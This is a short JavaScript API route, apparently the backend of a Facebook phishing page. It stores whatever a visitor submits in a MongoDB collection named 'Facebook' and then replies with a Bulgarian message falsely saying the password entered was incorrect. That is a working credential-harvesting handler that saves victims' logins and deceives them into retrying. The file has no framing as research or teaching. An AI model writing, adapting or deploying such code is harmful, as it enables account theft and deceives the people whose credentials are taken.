import { connectMongo } from "../../../db/connectDb";

import Facebook from "../../../db/models/Facebook";

async function handler(req, res) {
  try {
    await connectMongo();

    await Facebook.create(req.body);

    res.json({ message: "Паролата която въведохте, е неправилна." });
  } catch (e) {
    res.status(400).json(e);
  }
}

export default handler;
